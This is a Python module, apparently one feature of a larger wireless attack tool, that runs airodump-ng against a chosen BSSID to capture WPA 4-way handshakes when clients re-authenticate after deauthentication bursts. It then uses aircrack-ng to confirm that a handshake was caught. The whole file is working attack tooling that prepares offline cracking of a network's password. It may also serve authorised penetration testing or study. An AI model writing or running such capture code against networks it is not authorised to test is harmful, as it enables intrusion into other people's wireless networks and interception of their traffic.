import subprocess
import os
import time
import threading

# Feature 2: Handshake Auto-Capture
# Monitors the channel for EAPOL frames indicative of a WPA handshake
# and saves them to a .cap file automatically.

class HandshakeCapture:
    def __init__(self, interface, bssid, output_dir="captures"):
        self.interface = interface
        self.bssid = bssid
        self.output_dir = output_dir
        self.process = None
        self.capture_file = None
        os.makedirs(output_dir, exist_ok=True)

    def log(self, msg):
        print(f"[Handshake] {msg}")

    def start(self):
        """
        Launches airodump-ng in the background targeting a specific BSSID.
        It writes all captured packets to a .cap file. When a deauth is triggered
        and active clients re-authenticate, the 4-way EAPOL handshake is recorded.
        """
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        self.capture_file = os.path.join(self.output_dir, f"handshake_{timestamp}")
        self.log(f"Starting handshake capture -> {self.capture_file}.cap")

        cmd = [
            "airodump-ng",
            "--bssid", self.bssid,
            "-w", self.capture_file,
            "--output-format", "cap",
            self.interface,
        ]

        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.log("Capture running. Will intercept any re-auth handshakes during deauth bursts.")

    def stop(self):
        if self.process:
            self.process.terminate()
            self.log(f"Handshake capture stopped. File saved: {self.capture_file}.cap")

    def check_handshake(self):
        """
        Uses aircrack-ng to verify if a valid WPA handshake was captured.
        Returns True if a handshake is confirmed in the file.
        """
        cap = f"{self.capture_file}.cap"
        if not os.path.exists(cap):
            return False

        result = subprocess.run(
            ["aircrack-ng", cap],
            capture_output=True, text=True
        )

        if "1 handshake" in result.stdout or "handshakes" in result.stdout:
            self.log("WPA Handshake CONFIRMED in capture file.")
            return True
        return False
